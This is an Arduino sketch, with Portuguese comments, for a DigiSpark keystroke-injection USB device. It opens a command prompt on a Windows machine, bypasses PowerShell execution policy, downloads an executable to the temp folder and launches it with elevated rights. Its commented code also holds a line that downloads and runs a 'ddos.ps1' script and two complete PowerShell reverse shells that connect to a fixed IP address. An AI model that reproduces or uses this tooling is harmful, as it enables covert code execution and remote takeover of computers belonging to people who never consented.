#include "DigiKeyboard.h"

void setup() {

  //Minizar Todos os Programas
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT);
  
  //Abrir o CM como Administrador
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(100);
  //DigiKeyboard.println("powershell -nop -w hidden Start-Process cmd -Verb runAs");
  DigiKeyboard.println("cmd");
  //DigiKeyboard.println("cmd.exe /T:01 /K mode CON: COLS=15 LINES=1");
  //DigiKeyboard.println("powershell -windowstyle hidden Start-Process cmd -Verb runAs");
  DigiKeyboard.delay(100);
  //DigiKeyboard.sendKeyStroke(KEY_ENTER);

  //TROCAR LAYUOT DO TECLADO PRA US INGLES
  DigiKeyboard.delay(300);
  DigiKeyboard.println("powershell -windowstyle hidden Set-WinUserLanguageList -LanguageList en-US");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.println("s");
  DigiKeyboard.delay(100);
  //DigiKeyboard.sendKeyStroke(KEY_ENTER);
  
  //Fazer Downloadd do Execute Payload.exe
  DigiKeyboard.delay(200);
  DigiKeyboard.println("powershell -ExecutionPolicy bypass -noprofile (New-Object Net.WebClient).DownloadFile('https://the.earth.li/~sgtatham/putty/latest/x86/putty.exe','%TEMP%\CT.exe');Start-Process '%TEMP%\CT.exe' -Verb runAs");
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(300);
  
  //TROCAR LAYUOT DO TECLADO PRA BR
  DigiKeyboard.println("powershell Set-WinUserLanguageList -LanguageList pt-BR");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.println("s");
  DigiKeyboard.delay(100);
  //DigiKeyboard.sendKeyStroke(KEY_ENTER);
  
  //EXIT
  
  //DigiKeyboard.println("exit");
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

}

void loop() {
  // put your main code here, to run repeatedly: -windowstyle hidden 
  //powershell Start-Process powershell -Verb runAs
  //$down = New-Object System.Net.WebClient; $url = 'http://192.168.1.7/ddos.ps1'; $file = 'C:\tmp\ddos.ps1'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file); exit;
  
 
#$client = New-Object System.Net.Sockets.TCPClient("192.168.254.1",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

#$sm=(New-Object Net.Sockets.TCPClient("192.168.254.1",55555)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}
  



}

